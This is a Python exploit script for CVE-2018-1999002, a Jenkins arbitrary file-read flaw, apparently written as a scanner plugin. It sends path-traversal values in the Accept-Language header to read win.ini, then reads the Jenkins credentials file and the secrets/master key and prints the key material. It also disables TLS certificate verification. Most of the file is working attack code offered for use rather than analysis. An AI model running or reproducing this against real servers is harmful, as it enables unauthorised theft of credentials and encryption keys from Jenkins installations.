#-*- coding: utf-8 -*-

import requests
import sys
import os
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def get_mes(host):
    num = 0
    url_pwd = host+'/plugin/jquery-detached/.xml'
    header_pwd = {'Accept-Language':'/../../../credentials'}
    url_hash = host+'/plugin/jquery-detached/.key'
    header_hash = {'Accept-Language':'/../../../secrets/master'}
    try:
        content_pwd = requests.get(url_pwd, headers=header_pwd, verify=False,timeout=5).text
        pat_content = r'<username>(.*?)</password>'
        pat_user = r'(.*?)</username>'
        pat_pwd = r'<password>(.*)'
        content_part = re.findall(pat_content, content_pwd, re.S)
        for i in content_part:
            i = i.replace('\n', '')
            users = re.findall(pat_user, i, re.S)
            pwds = re.findall(pat_pwd, i)

        content_hash = requests.get(url_hash, headers=header_hash, verify=False,timeout=5).content
        return content_hash
    except Exception as e:
        msg = str(e)
        return msg

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if CVE-2018-1999002 jenkins file read vul')
    header_ini = {'Accept-Language': '/../../../../../../../../../windows/win'}
    url_ini = url + '/plugin/credentials/.ini'
    try:
        content_ini = requests.get(url_ini, headers=header_ini, verify=False,timeout=4).text
        if 'for 16-bit app support' in content_ini:
            hashstring = get_mes(url)
            msg = 'There is CVE-2018-1999002 jenkins file read vul on url: ' + url_ini + ' . The result of reading passwd file is:  ' + hashstring + '   .'
            number = 'v91'
            print(msg)
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no CVE-2018-1999002 jenkins file read vul'
    number = 'v0'
    return False, url, number, msg




